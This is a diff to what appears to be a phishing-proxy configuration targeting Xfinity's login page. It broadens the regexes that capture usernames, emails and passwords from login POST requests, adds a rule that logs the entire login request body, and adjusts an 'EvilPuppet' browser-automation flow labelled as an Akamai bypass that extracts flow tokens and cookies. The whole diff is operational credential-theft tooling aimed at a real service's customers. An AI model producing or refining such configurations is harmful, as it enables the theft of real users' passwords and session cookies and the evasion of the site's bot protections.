@@ -31,15 +31,15 @@ auth_tokens:
 credentials:
   # Username/Email capture
   username:
-    key: 'user'
-    search: '(.*)'
+    key: ''
+    search: '(?:user|username|email|id|login)"?\s*[:=]\s*"?([^"&]+)"?'
     type: 'post'
     page: '/login'
     
   # Password capture (this happens on the next step)
   password:
-    key: 'passwd'
-    search: '(.*)'
+    key: ''
+    search: '(?:passwd|password)"?\s*[:=]\s*"?([^"&]+)"?'
     type: 'post'
     page: '/login'
     
@@ -65,6 +65,10 @@ credentials:
       search: '(.*)'
       type: 'post'
       page: '/login'
+    - key: 'debug_body'
+      search: '(.*)'
+      type: 'post'
+      page: '/login'
 
 # ============================================
 # EVILPUPPET CONFIGURATION FOR AKAMAI BYPASS
@@ -78,7 +82,7 @@ puppet:
       name: "Xfinity Login Flow"
       domains: ["login.xfinity.com"]
       paths: ["/login"]
-      auto_activate: true
+      auto_activate: false
       open_url: "https://login.xfinity.com/login"
       tokens: ["flowId", "flowStateId", "flowStep"]
       extract_cookies: true
@@ -101,12 +105,12 @@ puppet:
           required: true
           timeout: 20000
           post_wait: 5000
-        # Press Enter on the input field (Replaces clicking the button)
-        - selector: 'input#user'
-          enter: true
+        # Click the sign in button explicitly (Retry with correct UA)
+        - selector: '#sign_in'
+          click: true
           required: true
           timeout: 15000
-          post_wait: 2000
+          post_wait: 10000
         # Wait for password field to ensure we are on the next page
         - selector: '#passwd'
           post_wait: 1000
